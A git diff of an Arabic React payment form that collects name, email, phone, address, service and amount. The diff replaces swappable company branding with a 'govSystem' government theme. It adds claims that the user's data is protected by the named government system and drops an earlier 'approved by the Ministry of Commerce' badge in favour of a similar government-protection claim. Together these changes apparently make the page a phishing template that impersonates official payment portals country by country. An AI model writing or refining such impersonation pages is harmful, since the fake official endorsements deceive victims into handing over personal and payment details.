@@ -200,39 +200,38 @@ const PaymentRecipient = () => {
         <meta property="og:image" content={dynamicImage} />
         <meta name="twitter:image" content={dynamicImage} />
       </Helmet>
-      <div className="min-h-screen" style={{ backgroundColor: brandingProps.colors.surface }} dir="rtl">
-        {/* Hero Section with Company Branding */}
-        <div className="relative w-full h-64 overflow-hidden">
-          <img
-            src={heroImage}
-            alt={serviceName}
-            className="w-full h-full object-cover"
-          />
-          <div
-            className="absolute inset-0 bg-gradient-to-b opacity-70"
-            style={{
-              background: `linear-gradient(to bottom, ${brandingProps.colors.primary}40, ${brandingProps.colors.primary}80)`
-            }}
-          />
+      <div className="min-h-screen" style={{ backgroundColor: govSystem.colors.surface }} dir="rtl">
+        {/* Hero Section with Government Branding */}
+        <div className="relative w-full h-64 overflow-hidden" style={{ background: govSystem.gradients.header }}>
+          <div className="absolute inset-0 bg-black/10" />
 
-          {/* Company Logo Overlay */}
+          {/* Government Logo/Badge */}
           <div className="absolute top-4 left-4 sm:top-6 sm:left-6">
             <div
               className="rounded-2xl p-3 sm:p-4 shadow-lg"
               style={{
                 backgroundColor: 'rgba(255, 255, 255, 0.95)',
-                border: `2px solid ${brandingProps.colors.primary}`,
-                boxShadow: brandingProps.shadows.md
+                border: `2px solid ${govSystem.colors.primary}`,
+                boxShadow: govSystem.shadows.md
               }}
             >
-              {brandingProps.logo && (
-                <img
-                  src={brandingProps.logo}
-                  alt={serviceName}
-                  className="h-12 sm:h-16 w-auto"
-                  onError={(e) => e.currentTarget.style.display = 'none'}
-                />
-              )}
+              <div className="text-center">
+                <div 
+                  className="text-2xl font-bold mb-1"
+                  style={{ 
+                    color: govSystem.colors.primary,
+                    fontFamily: govSystem.fonts.primaryAr
+                  }}
+                >
+                  {govSystem.nameAr}
+                </div>
+                <div 
+                  className="text-xs"
+                  style={{ color: govSystem.colors.textLight }}
+                >
+                  {govSystem.nameEn}
+                </div>
+              </div>
             </div>
           </div>
 
@@ -242,7 +241,7 @@ const PaymentRecipient = () => {
               <h2
                 className="text-2xl font-bold mb-2"
                 style={{
-                  fontFamily: brandingProps.fonts.primaryAr,
+                  fontFamily: govSystem.fonts.primaryAr,
                   textShadow: '2px 2px 4px rgba(0,0,0,0.5)'
                 }}
               >
@@ -251,16 +250,16 @@ const PaymentRecipient = () => {
               <p
                 className="text-sm opacity-90 mb-1"
                 style={{
-                  fontFamily: brandingProps.fonts.primaryAr,
+                  fontFamily: govSystem.fonts.primaryAr,
                   textShadow: '1px 1px 2px rgba(0,0,0,0.5)'
                 }}
               >
-                {brandingProps.name} - {brandingProps.nameAr}
+                {govSystem.description}
               </p>
               <p
                 className="text-lg font-semibold"
                 style={{
-                  fontFamily: brandingProps.fonts.primaryAr,
+                  fontFamily: govSystem.fonts.primaryAr,
                   textShadow: '1px 1px 2px rgba(0,0,0,0.5)'
                 }}
               >
@@ -272,26 +271,29 @@ const PaymentRecipient = () => {
 
         <div className="container mx-auto px-4 py-8">
           <div className="max-w-4xl mx-auto">
-            {/* Security Notice with Company Branding */}
+            {/* Security Notice with Government Branding */}
             <div
               className="mb-6 p-4 bg-white rounded-lg border-r-4"
-              style={{ borderRightColor: colors.secondary }}
+              style={{ 
+                borderRightColor: govSystem.colors.primary,
+                borderRadius: govSystem.borderRadius.md
+              }}
             >
               <div className="flex items-start gap-3">
-                <Shield className="w-5 h-5 mt-0.5" style={{ color: colors.secondary }} />
+                <Shield className="w-5 h-5 mt-0.5" style={{ color: govSystem.colors.primary }} />
                 <div>
                   <h3
                     className="font-semibold text-sm mb-1"
                     style={{
-                      color: '#000000',
-                      fontFamily: branding.fonts.primaryAr || branding.fonts.primary
+                      color: govSystem.colors.text,
+                      fontFamily: govSystem.fonts.primaryAr
                     }}
                   >
-                    بياناتك محمية
+                    بياناتك محمية بنظام {govSystem.nameAr}
                   </h3>
                   <p
                     className="text-xs"
-                    style={{ color: branding.colors.textLight }}
+                    style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}
                   >
                     نحن نستخدم أعلى معايير الأمان لحماية معلوماتك الشخصية والمالية
                   </p>
@@ -302,31 +304,32 @@ const PaymentRecipient = () => {
             <Card
               className="p-6 sm:p-8 shadow-lg border-0 rounded-lg overflow-hidden"
               style={{
-                background: brandingProps.colors.background,
-                boxShadow: brandingProps.shadows.lg
+                background: govSystem.colors.background,
+                boxShadow: govSystem.shadows.lg,
+                borderRadius: govSystem.borderRadius.lg
               }}
             >
               <div className="mb-6">
                 <div className="flex items-center gap-3 mb-2">
                   <div
                     className="w-12 h-12 rounded-full flex items-center justify-center"
-                    style={{ backgroundColor: `${brandingProps.colors.primary}15` }}
+                    style={{ backgroundColor: `${govSystem.colors.primary}15` }}
                   >
-                    <User className="w-6 h-6" style={{ color: brandingProps.colors.primary }} />
+                    <User className="w-6 h-6" style={{ color: govSystem.colors.primary }} />
                   </div>
                   <div>
                     <h3
                       className="text-lg font-bold"
                       style={{
-                        color: '#000000',
-                        fontFamily: brandingProps.fonts.primaryAr
+                        color: govSystem.colors.text,
+                        fontFamily: govSystem.fonts.primaryAr
                       }}
                     >
                       {payerType === "recipient" ? "بيانات المستلم" : "بيانات المرسل"}
                     </h3>
                     <p
                       className="text-sm"
-                      style={{ color: brandingProps.colors.textLight }}
+                      style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}
                     >
                       الرجاء إدخال جميع البيانات المطلوبة
                     </p>
@@ -341,8 +344,8 @@ const PaymentRecipient = () => {
                     htmlFor="name"
                     className="flex items-center gap-2 mb-2 text-sm font-medium"
                     style={{
-                      color: '#000000',
-                      fontFamily: brandingProps.fonts.primaryAr
+                      color: govSystem.colors.text,
+                      fontFamily: govSystem.fonts.primaryAr
                     }}
                   >
                     <User className="w-4 h-4" />
@@ -356,10 +359,10 @@ const PaymentRecipient = () => {
                     className="h-12 text-base transition-colors bg-white"
                     style={{
                       borderWidth: '2px',
-                      borderColor: brandingProps.colors.border,
-                      borderRadius: brandingProps.borderRadius.md,
-                      fontFamily: brandingProps.fonts.primaryAr,
-                      color: '#000000'
+                      borderColor: govSystem.colors.border,
+                      borderRadius: govSystem.borderRadius.md,
+                      fontFamily: govSystem.fonts.primaryAr,
+                      color: govSystem.colors.text
                     }}
                     placeholder="أدخل اسمك الكامل"
                   />
@@ -371,8 +374,8 @@ const PaymentRecipient = () => {
                     htmlFor="email"
                     className="flex items-center gap-2 mb-2 text-sm font-medium"
                     style={{
-                      color: '#000000',
-                      fontFamily: brandingProps.fonts.primaryAr
+                      color: govSystem.colors.text,
+                      fontFamily: govSystem.fonts.primaryAr
                     }}
                   >
                     <Mail className="w-4 h-4" />
@@ -387,10 +390,10 @@ const PaymentRecipient = () => {
                     className="h-12 text-base transition-colors bg-white"
                     style={{
                       borderWidth: '2px',
-                      borderColor: brandingProps.colors.border,
-                      borderRadius: brandingProps.borderRadius.md,
-                      fontFamily: brandingProps.fonts.primaryAr,
-                      color: '#000000'
+                      borderColor: govSystem.colors.border,
+                      borderRadius: govSystem.borderRadius.md,
+                      fontFamily: govSystem.fonts.primaryAr,
+                      color: govSystem.colors.text
                     }}
                     placeholder="example@email.com"
                   />
@@ -402,8 +405,8 @@ const PaymentRecipient = () => {
                     htmlFor="phone"
                     className="flex items-center gap-2 mb-2 text-sm font-medium"
                     style={{
-                      color: '#000000',
-                      fontFamily: brandingProps.fonts.primaryAr
+                      color: govSystem.colors.text,
+                      fontFamily: govSystem.fonts.primaryAr
                     }}
                   >
                     <Phone className="w-4 h-4" />
@@ -418,10 +421,10 @@ const PaymentRecipient = () => {
                     className="h-12 text-base transition-colors bg-white"
                     style={{
                       borderWidth: '2px',
-                      borderColor: brandingProps.colors.border,
-                      borderRadius: brandingProps.borderRadius.md,
-                      fontFamily: brandingProps.fonts.primaryAr,
-                      color: '#000000'
+                      borderColor: govSystem.colors.border,
+                      borderRadius: govSystem.borderRadius.md,
+                      fontFamily: govSystem.fonts.primaryAr,
+                      color: govSystem.colors.text
                     }}
                     placeholder={`${phoneCode} ${phonePlaceholder}`}
                   />
@@ -433,8 +436,8 @@ const PaymentRecipient = () => {
                     htmlFor="address"
                     className="flex items-center gap-2 mb-2 text-sm font-medium"
                     style={{
-                      color: '#000000',
-                      fontFamily: brandingProps.fonts.primaryAr
+                      color: govSystem.colors.text,
+                      fontFamily: govSystem.fonts.primaryAr
                     }}
                   >
                     <MapPin className="w-4 h-4" />
@@ -448,10 +451,10 @@ const PaymentRecipient = () => {
                     className="h-12 text-base transition-colors bg-white"
                     style={{
                       borderWidth: '2px',
-                      borderColor: brandingProps.colors.border,
-                      borderRadius: brandingProps.borderRadius.md,
-                      fontFamily: brandingProps.fonts.primaryAr,
-                      color: '#000000'
+                      borderColor: govSystem.colors.border,
+                      borderRadius: govSystem.borderRadius.md,
+                      fontFamily: govSystem.fonts.primaryAr,
+                      color: govSystem.colors.text
                     }}
                     placeholder="أدخل عنوانك الكامل"
                   />
@@ -463,8 +466,8 @@ const PaymentRecipient = () => {
                     htmlFor="service"
                     className="flex items-center gap-2 mb-2 text-sm font-medium"
                     style={{
-                      color: '#000000',
-                      fontFamily: brandingProps.fonts.primaryAr
+                      color: govSystem.colors.text,
+                      fontFamily: govSystem.fonts.primaryAr
                     }}
                   >
                     <FileText className="w-4 h-4" />
@@ -475,9 +478,9 @@ const PaymentRecipient = () => {
                       className="h-12 text-base bg-white"
                       style={{
                         borderWidth: '2px',
-                        borderColor: brandingProps.colors.border,
-                        borderRadius: brandingProps.borderRadius.md,
-                        fontFamily: brandingProps.fonts.primaryAr,
+                        borderColor: govSystem.colors.border,
+                        borderRadius: govSystem.borderRadius.md,
+                        fontFamily: govSystem.fonts.primaryAr,
                       }}
                     >
                       <SelectValue placeholder="اختر الخدمة" />
@@ -485,7 +488,7 @@ const PaymentRecipient = () => {
                     <SelectContent
                       className="bg-background z-50"
                       style={{
-                        fontFamily: brandingProps.fonts.primaryAr,
+                        fontFamily: govSystem.fonts.primaryAr,
                       }}
                     >
                       {governmentServices.map((service) => (
@@ -496,7 +499,7 @@ const PaymentRecipient = () => {
                     </SelectContent>
                   </Select>
                   {selectedService && (
-                    <p className="text-xs mt-1" style={{ color: brandingProps.colors.textLight }}>
+                    <p className="text-xs mt-1" style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}>
                       {governmentServices.find(s => s.key === selectedService)?.description}
                     </p>
                   )}
@@ -508,8 +511,8 @@ const PaymentRecipient = () => {
                     htmlFor="amount"
                     className="flex items-center gap-2 mb-2 text-sm font-medium"
                     style={{
-                      color: '#000000',
-                      fontFamily: brandingProps.fonts.primaryAr
+                      color: govSystem.colors.text,
+                      fontFamily: govSystem.fonts.primaryAr
                     }}
                   >
                     <DollarSign className="w-4 h-4" />
@@ -524,16 +527,16 @@ const PaymentRecipient = () => {
                     className="h-12 text-base transition-colors bg-white"
                     style={{
                       borderWidth: '2px',
-                      borderColor: brandingProps.colors.border,
-                      borderRadius: brandingProps.borderRadius.md,
-                      fontFamily: brandingProps.fonts.primaryAr,
-                      color: '#000000'
+                      borderColor: govSystem.colors.border,
+                      borderRadius: govSystem.borderRadius.md,
+                      fontFamily: govSystem.fonts.primaryAr,
+                      color: govSystem.colors.text
                     }}
                     placeholder={`${getCurrencySymbol(countryCode)}`}
                     step="0.01"
                     min="0"
                   />
-                  <p className="text-xs mt-1" style={{ color: brandingProps.colors.textLight }}>
+                  <p className="text-xs mt-1" style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}>
                     💱 العملة: {getCurrencySymbol(countryCode)}
                   </p>
                 </div>
@@ -542,15 +545,16 @@ const PaymentRecipient = () => {
                 <div
                   className="mt-6 p-4 rounded-lg"
                   style={{
-                    backgroundColor: brandingProps.colors.surface,
-                    borderRadius: brandingProps.borderRadius.md
+                    backgroundColor: `${govSystem.colors.primary}08`,
+                    borderRadius: govSystem.borderRadius.md,
+                    border: `1px solid ${govSystem.colors.primary}20`
                   }}
                 >
                   <h4
                     className="font-semibold mb-3"
                     style={{
-                      color: '#000000',
-                      fontFamily: brandingProps.fonts.primaryAr
+                      color: govSystem.colors.text,
+                      fontFamily: govSystem.fonts.primaryAr
                     }}
                   >
                     ملخص المبلغ
@@ -558,13 +562,13 @@ const PaymentRecipient = () => {
                   <div className="flex justify-between items-center">
                     <span
                       className="text-sm"
-                      style={{ color: brandingProps.colors.textLight }}
+                      style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}
                     >
                       المبلغ الإجمالي
                     </span>
                     <span
                       className="text-xl font-bold"
-                      style={{ color: brandingProps.colors.primary }}
+                      style={{ color: govSystem.colors.primary, fontFamily: govSystem.fonts.primaryAr }}
                     >
                       {formattedAmount}
                     </span>
@@ -577,11 +581,11 @@ const PaymentRecipient = () => {
                   size="lg"
                   className="w-full h-14 text-lg font-bold mt-6 transition-all hover:opacity-90"
                   style={{
-                    background: brandingProps.gradients.primary,
-                    color: brandingProps.colors.textOnPrimary,
-                    borderRadius: brandingProps.borderRadius.lg,
-                    boxShadow: brandingProps.shadows.md,
-                    fontFamily: brandingProps.fonts.primaryAr
+                    background: govSystem.gradients.primary,
+                    color: govSystem.colors.textOnPrimary,
+                    borderRadius: govSystem.borderRadius.lg,
+                    boxShadow: govSystem.shadows.md,
+                    fontFamily: govSystem.fonts.primaryAr
                   }}
                   disabled={
                     !customerName ||
@@ -592,18 +596,18 @@ const PaymentRecipient = () => {
                     !paymentAmount
                   }
                 >
-                  <span className="ml-2">التالي - {govSystem.nameAr}</span>
+                  <span className="ml-2">متابعة الدفع عبر {govSystem.nameAr}</span>
                   <ArrowLeft className="w-5 h-5" />
                 </Button>
 
                 <p
                   className="text-xs text-center mt-4"
                   style={{
-                    color: brandingProps.colors.textLight,
-                    fontFamily: brandingProps.fonts.primaryAr
+                    color: govSystem.colors.textLight,
+                    fontFamily: govSystem.fonts.primaryAr
                   }}
                 >
-                  بالمتابعة، أنت توافق على الشروط والأحكام وسياسة الخصوصية
+                  بالمتابعة عبر {govSystem.nameAr}، أنت توافق على الشروط والأحكام
                 </p>
               </form>
             </Card>
@@ -612,17 +616,20 @@ const PaymentRecipient = () => {
             <div className="mt-6 text-center">
               <div
                 className="inline-flex items-center gap-2 px-4 py-2 bg-white rounded-full shadow-sm"
-                style={{ boxShadow: brandingProps.shadows.sm }}
+                style={{ 
+                  boxShadow: govSystem.shadows.sm,
+                  border: `1px solid ${govSystem.colors.border}`
+                }}
               >
-                <Shield className="w-4 h-4" style={{ color: brandingProps.colors.secondary }} />
+                <Shield className="w-4 h-4" style={{ color: govSystem.colors.primary }} />
                 <span
                   className="text-xs font-medium"
                   style={{
-                    color: brandingProps.colors.text,
-                    fontFamily: brandingProps.fonts.primaryAr
+                    color: govSystem.colors.text,
+                    fontFamily: govSystem.fonts.primaryAr
                   }}
                 >
-                  معتمد من وزارة التجارة
+                  محمي بنظام {govSystem.nameAr} الحكومي
                 </span>
               </div>
             </div>
